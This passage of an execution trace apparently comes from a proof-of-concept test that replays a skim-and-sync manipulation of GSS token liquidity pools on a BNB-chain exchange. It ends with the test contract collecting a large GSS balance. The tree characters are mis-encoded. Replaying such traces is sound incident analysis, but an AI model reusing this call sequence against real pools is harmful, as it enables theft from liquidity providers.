    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 708161974177853124557886 [7.081e23]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23232] GSS_USDT_POOL::swap(0, 54202014195502325829 [5.42e19], 0x8A85f4d6D051de5C91933DA50A61E22cD562377D, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8071] USDT::transfer(0x8A85f4d6D051de5C91933DA50A61E22cD562377D, 54202014195502325829 [5.42e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x8A85f4d6D051de5C91933DA50A61E22cD562377D, value: 54202014195502325829 [5.42e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 708161974177853124557886 [7.081e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57665670227026483727828 [5.766e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 708161974177853124557886 [7.081e23], reserve1: 57665670227026483727828 [5.766e22])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 666666666666666666667 [6.666e20], amount1In: 0, amount0Out: 0, amount1Out: 54202014195502325829 [5.42e19], to: 0x8A85f4d6D051de5C91933DA50A61E22cD562377D)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2893] 0x8A85f4d6D051de5C91933DA50A61E22cD562377D::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 22331259578998002367735 [2.233e22], 104360313743260586180632 [1.043e23], 1692807565 [1.692e9]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(0x8A85f4d6D051de5C91933DA50A61E22cD562377D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 22385461593193504693564 [2.238e22]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [52540] 0x8A85f4d6D051de5C91933DA50A61E22cD562377D::swap(0, 252057880985113455700 [2.52e20], 0x000000000000000000000000000000000000dEaD, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [18030] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::transfer(0x000000000000000000000000000000000000dEaD, 252057880985113455700 [2.52e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x8A85f4d6D051de5C91933DA50A61E22cD562377D, to: 0x000000000000000000000000000000000000dEaD, value: 252057880985113455700 [2.52e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(0x8A85f4d6D051de5C91933DA50A61E22cD562377D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 22385461593193504693564 [2.238e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [667] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::balanceOf(0x8A85f4d6D051de5C91933DA50A61E22cD562377D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 104108255862275472724932 [1.041e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 22385461593193504693564 [2.238e22], reserve1: 104108255862275472724932 [1.041e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 54202014195502325829 [5.42e19], amount1In: 0, amount0Out: 0, amount1Out: 252057880985113455700 [2.52e20], to: 0x000000000000000000000000000000000000dEaD)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [667] 0x6E905369F331da92A257Aea758aF0B8D93587A5e::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 895890744137724527324568 [8.958e23]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0xEE7c3b3EF48735847A81334A9689FEC83fEF5ea1, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0xc382becE8117A412935E7EB707bF2716f362c335, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0x8EF3003077926E646dE58A650F48BC88437a1537, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 21214870549862948669799 [2.121e22])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, value: 7071623516620982889933 [7.071e21])
    в”‚   в”‚   в”‚   в”њв”Ђ [3151] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::distributeETHDividends(7071623516620982889933 [7.071e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendsDistributed(param0: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], param1: 7071623516620982889933 [7.071e21])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 7071623516620982889933 [7.071e21])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], value: 671804234078993374543663 [6.718e23])
    в”‚   в”‚   в”‚   в”њв”Ђ [60774] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18084198172924888727518 [1.808e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 725246549835023177720846 [7.252e23])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendWithdrawn(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 2046358021051913909985 [2.046e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4072] GSS::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2046358021051913909985 [2.046e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2046358021051913909985 [2.046e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ  emit topic 0: 0xa2c38e2d2fb7e3e1912d937fd1ca11ed6d51864dee4cfa7a7bf02becd7acf092
    в”‚   в”‚   в”‚   в”‚   в”‚        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    в”‚   в”‚   в”‚   в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”‚   в”‚   в”‚           data: 0x00000000000000000000000000000000000000000000006eeeec2213c6a8b6e1
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [788] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 1379966208256846499101549 [1.379e24])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [114089] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::process(150000 [1.5e5])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [378740] GSS_USDT_POOL::skim(GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64])
    в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1379966208256846499101549 [1.379e24]
    в”‚   в”‚   в”‚   в”њв”Ђ [364869] GSS::transfer(GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], 671804234078993374543663 [6.718e23])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0x45f1dFB88D3eDb74a10C7A9D98263975Fbda55c2, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0xD09D888C026561dE338321793FFCFBf3E4CBc851, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], to: 0x6CaD809953d0f4D76FDa83AE03969aAD8409BfD1, value: 10000000000000 [1e13])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], value: 20154127022369801236309 [2.015e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x981c20A7AB02B89453fCd630bFa8E933896C296e, value: 6718042340789933745436 [6.718e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3151] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::distributeETHDividends(6718042340789933745436 [6.718e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DividendsDistributed(param0: GSS: [0x37e42B961AE37883BAc2fC29207A5F88eFa5db66], param1: 6718042340789933745436 [6.718e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x000000000000000000000000000000000000dEaD, value: 6718042340789933745436 [6.718e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], value: 638214022375043705816482 [6.382e23])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [788] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], 708161974177853124557886 [7.081e23])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2788] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::setBalance(GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], 1466584579311121681837935 [1.466e24])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [50089] 0x981c20A7AB02B89453fCd630bFa8E933896C296e::process(150000 [1.5e5])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2439] GSS_GSSDAO_POOL::totalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 114837290655451676152915 [1.148e23]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x53A23dDBB469E3cFac44B6CD7306E5F3Ce503481) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x81FD998B1660c2b55233198140D9afE54B85DBEA) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1380108884598555758294 [1.38e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x81FD998B1660c2b55233198140D9afE54B85DBEA, value: 25516996831034322082 [2.551e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0xCb67f2e223D7caEfBe7457BC8A9C387D6E2BDD3B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 957792824888626561249 [9.577e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0xCb67f2e223D7caEfBe7457BC8A9C387D6E2BDD3B, value: 17708745121642752914 [1.77e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x3389765a05896a39B16628B43C27E76f97Ec7BfC) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x9045394ea5F9f30192151b3879cA973f7E4894A2) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 42928780601289071486 [4.292e19]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x9045394ea5F9f30192151b3879cA973f7E4894A2, value: 793715315354913724 [7.937e17])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x8754bB8a43B531FF9f666C8852d30950B4a81067) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x791EECf76f0E5bE75cB36280D1851f0F5155F452) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1194409434286292786969 [1.194e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x791EECf76f0E5bE75cB36280D1851f0F5155F452, value: 22083577672573389384 [2.208e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x4f64a23a0d8Ff69Aa326ed13a312f28A22D08714) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x008cA6c5F41e846D2570033AF0F87D483CcC77E1) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 215767287832260286 [2.157e17]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x008cA6c5F41e846D2570033AF0F87D483CcC77E1, value: 3989346972038482 [3.989e15])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x37074A23535f49C66228c2f8704fb5cA49960146) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2059552028476650203527 [2.059e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x37074A23535f49C66228c2f8704fb5cA49960146, value: 38079301691674646025 [3.807e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x72aD62137074F1292094Ce1a231e9c2793115e58) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, value: 13436084681579867490873 [1.343e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x6ad247649d2371C9cA25340760078B65a3B87cbc, value: 13436084681579867490873 [1.343e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: 0x000000000000000000000000000000000000dEaD, value: 6718042340789933745436 [6.718e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], value: 638214022375043705816481 [6.382e23])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x5E66C2439AFA6aD4A30Ad049baD89cc6F50b8d70) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57665670227026483727828 [5.766e22]
    в”‚   в”‚   в”‚   в”њв”Ђ [5271] USDT::transfer(GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], 0)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0], to: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], value: 0)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [9045] GSS_USDT_POOL::sync()
    в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 36357740098859750014223 [3.635e22]
    в”‚   в”‚   в”‚   в”њв”Ђ [531] USDT::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 57665670227026483727828 [5.766e22]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 36357740098859750014223 [3.635e22], reserve1: 57665670227026483727828 [5.766e22])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [217063] GSS_GSSDAO_POOL::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”њв”Ђ [602] GSS::balanceOf(GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2104798601686165387654416 [2.104e24]
    в”‚   в”‚   в”‚   в”њв”Ђ [193154] GSS::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1276428044750087411632963 [1.276e24])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [439] GSS_GSSDAO_POOL::totalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 114837290655451676152915 [1.148e23]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x304AcdEf2EC30F00183C3C99683e6a23ffaE1c58) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1669797787058025995003 [1.669e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x304AcdEf2EC30F00183C3C99683e6a23ffaE1c58, value: 224726272744539543227 [2.247e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x5f29715A02591a638EEE611Bf887e52F64fB2d8A) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x8C1C97D898eE7F57923A7b96286336D0917E60F6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1133874434353101941221 [1.133e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x8C1C97D898eE7F57923A7b96286336D0917E60F6, value: 152600139590220279397 [1.526e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x0E897eFD1422809D012368B479780db1A4C3C168) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x97A4027D4A628c8c0666C6642FB4C6547a191aB3) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x0a2d40eBe84b324FF2FD98F45077684B788ABeb9) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2033405148249778473579 [2.033e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x0a2d40eBe84b324FF2FD98F45077684B788ABeb9, value: 273661615488684974484 [2.736e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0xA0ad89c171f90bE3a37A77d2B569B2D09c9A2977) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1496244626911016966966 [1.496e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0xA0ad89c171f90bE3a37A77d2B569B2D09c9A2977, value: 201368980559124656650 [2.013e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x9D29977BFa135e29D2d0054e4e597Ee261f03D27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 3097772779614245233409 [3.097e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x9D29977BFa135e29D2d0054e4e597Ee261f03D27, value: 416907326125238059937 [4.169e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0xA26d893e222C8F88991D1983B3a6007295f1E209) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 652954740333413535333 [6.529e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0xA26d893e222C8F88991D1983B3a6007295f1E209, value: 87876559786641734318 [8.787e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x99d1Bb66c6409c35C94A82b2999E48a1867C21Dd) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1207770347136812660911 [1.207e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x99d1Bb66c6409c35C94A82b2999E48a1867C21Dd, value: 162545267784573195708 [1.625e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(0x75C57617c7082564ddC0516ba9c422D71DA5e6FF) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2505215562949452010012 [2.505e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, to: 0x75C57617c7082564ddC0516ba9c422D71DA5e6FF, value: 337159241823620721505 [3.371e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], to: 0xB22D5c1c2d4F2dca332aB8294971fD9A41f82e73, value: 25528560895001748232659 [2.552e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], to: 0x6ad247649d2371C9cA25340760078B65a3B87cbc, value: 25528560895001748232659 [2.552e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], to: 0x000000000000000000000000000000000000dEaD, value: 12764280447500874116329 [1.276e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: GSS_GSSDAO_POOL: [0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1212606642512583041051316 [1.212e24])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] GSS_GSSDAO_POOL::balanceOf(GSS_USDT_POOL: [0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
